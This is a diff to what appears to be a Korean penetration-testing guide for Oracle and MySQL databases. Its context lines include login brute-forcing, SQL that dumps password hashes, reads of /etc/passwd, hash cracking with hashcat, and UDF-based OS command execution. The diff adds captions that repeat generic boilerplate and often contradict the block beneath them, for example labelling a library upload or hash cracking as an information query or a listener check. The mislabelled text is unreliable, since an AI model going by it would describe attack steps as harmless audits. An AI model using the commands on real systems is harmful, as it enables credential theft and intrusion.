@@ -39,6 +39,8 @@ msfconsole -q -x "use auxiliary/scanner/oracle/sid_enum; \
 
 ### 2-2. Oracle 기본 계정 브루트포스
 
+Oracle 데이터베이스 취약점을 점검하는 명령어입니다. TNS 리스너 설정과 기본 계정 사용 여부를 확인합니다.
+
 ```bash
 # Metasploit Oracle 로그인 브루트포스
 use auxiliary/scanner/oracle/oracle_login
@@ -62,6 +64,9 @@ Oracle 주요 기본 계정:
 ```
 
 ### 2-3. Oracle SQLi → OS 명령 실행
+
+
+데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
 
 ```sql
 -- UTL_FILE로 파일 읽기
@@ -94,6 +99,9 @@ SELECT DBMS_JAVA.RUNJAVA(
 
 ### 2-4. Oracle 패스워드 해시 추출 및 크랙
 
+
+데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+
 ```sql
 -- Oracle 11g 이하 — DES 기반 해시
 SELECT username, password FROM sys.user$ WHERE type# = 1;
@@ -101,6 +109,8 @@ SELECT username, password FROM sys.user$ WHERE type# = 1;
 -- Oracle 12c 이상 — SHA-512 기반
 SELECT name, spare4 FROM sys.user$ WHERE type# = 1;
 ```
+
+Oracle 데이터베이스 취약점을 점검하는 명령어입니다. TNS 리스너 설정과 기본 계정 사용 여부를 확인합니다.
 
 ```bash
 # Hashcat으로 Oracle 11g 해시 크랙
@@ -134,6 +144,9 @@ hashcat -m 12300 oracle12_hashes.txt rockyou.txt
 
 ### 3-1. MySQL 정보 수집
 
+
+MySQL 클라이언트로 접속하고 기본 정보를 수집합니다. `show databases`, `show grants`, `@@global.secure_file_priv` 등을 확인하여 파일 읽기/쓰기 권한과 데이터 덤프 가능성을 평가합니다.
+
 ```bash
 # nmap MySQL 스캔
 nmap -sV -p 3306 --script mysql-info,mysql-databases,mysql-users <target>
@@ -144,6 +157,9 @@ nmap -p 3306 --script mysql-brute <target>
 ```
 
 ### 3-2. MySQL UDF(User Defined Function)를 통한 OS 명령 실행
+
+
+데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
 
 ```sql
 -- 1단계: UDF 공유 라이브러리 업로드
@@ -201,6 +217,9 @@ if __name__ == "__main__":
 
 ### 3-3. MySQL 파일 읽기/쓰기
 
+
+데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+
 ```sql
 -- 파일 읽기 (FILE 권한 필요)
 SELECT LOAD_FILE('/etc/passwd');
@@ -217,6 +236,9 @@ SHOW VARIABLES LIKE 'secure_file_priv';
 
 ### 3-4. MySQL 해시 추출 및 크랙
 
+
+데이터베이스 정보 수집 SQL 쿼리입니다. 사용자 목록, 부여된 권한, 설치된 패키지 등을 조회하여 권한 상승 가능성과 공격 경로를 분석합니다.
+
 ```sql
 -- MySQL 5.x 이하
 SELECT user, password FROM mysql.user;
@@ -224,6 +246,8 @@ SELECT user, password FROM mysql.user;
 -- MySQL 8.x (SHA-256 기반)
 SELECT user, authentication_string FROM mysql.user;
 ```
+
+MySQL/MariaDB 보안 설정을 점검합니다. 원격 root 접속 허용, 빈 비밀번호 계정, 불필요한 권한 등을 확인합니다.
 
 ```bash
 # MySQL 4.x/5.x (MySQL323 / MySQL41 해시)
